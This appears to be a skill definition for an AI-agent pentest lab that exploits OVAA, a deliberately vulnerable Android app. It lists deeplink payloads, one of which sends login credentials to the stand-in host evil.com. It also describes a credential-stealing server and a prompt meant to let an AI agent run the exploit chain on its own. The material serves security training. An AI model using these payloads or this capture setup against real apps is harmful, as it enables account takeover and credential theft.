# OVAA Deeplink Exploitation & Account Takeover Lab

## Metadata
- **Skill ID**: `ovaa-deeplink-exploitation`
- **Category**: Mobile Security / Android Pentesting
- **Severity**: CRITICAL (ATO via credential theft)
- **Runtime**: JDK 17+, Android SDK 34+, Android NDK 27
- **Orchestrator**: Maestro CLI v2.6+ & OpenCode CLI Agent v1.17+
- **Status**: VALIDATED - 5/5 scenarios + network capture confirmed

## Description
Automated exploitation and analysis of Inter-Component Communication (ICC) vulnerabilities in the OVAA (Oversecured Vulnerable Android App) application. This skill covers deeplink manipulation, WebView host validation bypass, credential leakage through log system + broadcast, arbitrary activity launching, state inconsistency attacks, and **real-time network credential capture with web interface visualization**.

## Target Application
- **Repository**: https://github.com/oversecured/ovaa
- **Package**: `oversecured.ovaa`
- **Min SDK**: 26 | **Target SDK**: 36

## Test Scenarios

| ID   | Vulnerability                         | Attack Vector / Deeplink                                | Impact                              |
|------|---------------------------------------|---------------------------------------------------------|-------------------------------------|
| TC01 | Arbitrary login_url Injection         | `oversecured://ovaa/login?url=http://evil.com/`         | ATO via credential exfiltration     |
| TC02 | WebView Host Validation Bypass        | `oversecured://ovaa/webview?url=...`                    | File Theft via arbitrary JavaScript |
| TC03 | Credential Leakage (log + broadcast)  | `oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA`  | Credential Leakage (logcat)         |
| TC04 | Arbitrary Activity Launch             | `redirect_intent` Parameter                             | Activity Hijacking                  |
| TC05 | State Inconsistency                   | Sequential Deeplink Manipulation                        | DoS / App Crash                     |

## Prerequisites

### System Requirements
```bash
# Java
JDK 17 or higher (OpenJDK 21 tested)

# Android SDK
API 34+ (tested with API 36)
Build Tools 34.0.0+

# ADB
Android Debug Bridge (adb) with emulator access

# Maestro CLI
curl -Ls "https://get.maestro.mobile.dev" | bash

# OpenCode CLI
# Ensure opencode is in PATH
```

### Environment Variables
```bash
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
export ANDROID_SDK_ROOT=/home/d4x13/Android/Sdk
```

### Emulator Requirements
- Google Pixel x86_64 (Rooted)
- API 34+ (tested with API 36)
- Root access enabled (`adb shell su root id` should return uid=0)

## Quick Start

### Option A: Full Automated (AI Agent via prompt.txt)
```bash
# Load prompt.txt into OpenCode or any AI agent
cat prompt.txt
```

### Option B: Scripted
```bash
# 1. Setup environment
./setup_environment.sh

# 2. Terminal 1 - Start attacker server (with web interface)
python3 steal_server.py

# 3. Terminal 2 - Run full exploit chain
./full_exploit.sh

# 4. Open browser to view captured credentials
# http://127.0.0.1:8080/view
```

### Option C: Maestro UI Automation
```bash
maestro test ovaa_login_maestro.yaml
```

## Files in this Skill

| File | Description |
|------|-------------|
| `SKILL.md` | Skill definition (metadata + usage) |
| `README.md` | Full lab documentation (EN) |
| `prompt.txt` | **Single prompt** for AI agent to run entire lab |
| `LAPORAN_EKSPLOITASI_OVAA.txt` | Complete exploitation report (Bahasa Indonesia) |
| `ovaa_login_maestro.yaml` | Maestro YAML automation for login flow |
| `steal_server.py` | Attacker HTTP server + web interface (`/view`) |
| `full_exploit.sh` | Full exploit chain (TC01-TC05) |
| `setup_environment.sh` | Environment setup + OVAA build + install |
| `exploiter_agent.txt` | Multi-prompt templates for OpenCode agent |
| `evidence/` | Screenshots and captured evidence |

## Key Features

### Web-Based Credential Viewer (`steal_server.py`)
The attacker server includes a built-in web interface at `/view` that displays captured credentials in real-time:

```bash
# Start server
python3 steal_server.py

# View captured credentials in browser
curl http://127.0.0.1:8080/view
```

### Cleartext Traffic Patch
Android API 28+ blocks HTTP cleartext by default. `setup_environment.sh` automatically patches `AndroidManifest.xml` with `android:usesCleartextTraffic="true"` for the network capture demonstration.

### Three Evidence Vectors
| Vector | Command | Evidence |
|--------|---------|----------|
| Web View | `curl http://127.0.0.1:8080/view` | HTML page with captured credentials |
| Logcat | `adb logcat -d \| grep Processing` | `D/ovaa: Processing victim@company.com:SuperSecret123!` |
| SharedPrefs | `adb shell su root cat .../login_data.xml` | XML with email, password, login_url |

## Key Files in Target (OVAA Source)

| File | Vulnerability |
|------|--------------|
| `DeeplinkActivity.java:35-39` | TC01 - No validation on login URL parameter |
| `DeeplinkActivity.java:46-55` | TC02 - Weak host validation (`String.endsWith`) |
| `LoginActivity.java:59` | TC03 - Credentials logged via `Log.d()` |
| `LoginActivity.java:23,76-83` | TC04 - Arbitrary `redirect_intent` |
| `LoginUtils.java:49-50` | TC01 - `setLoginUrl()` stores arbitrary URL |
| `WebViewActivity.java:23-28` | TC02 - JS enabled + file access from file URLs |
| `AndroidManifest.xml:28,34` | TC04 - Exported activities |

## Notes

- **Cleartext Policy**: OVAA does not set `usesCleartextTraffic="true"`. On Android API 28+, HTTP cleartext is blocked. `setup_environment.sh` patches this automatically. For production testing without patch, use HTTPS attacker endpoints.
- **Root Requirement**: Some evidence extraction requires root access on emulator (`su root`).
- **Maestro**: Screenshots saved to `evidence/` directory.
- **AI Agent**: Use `prompt.txt` as a single comprehensive prompt for any AI coding agent to run this lab autonomously.
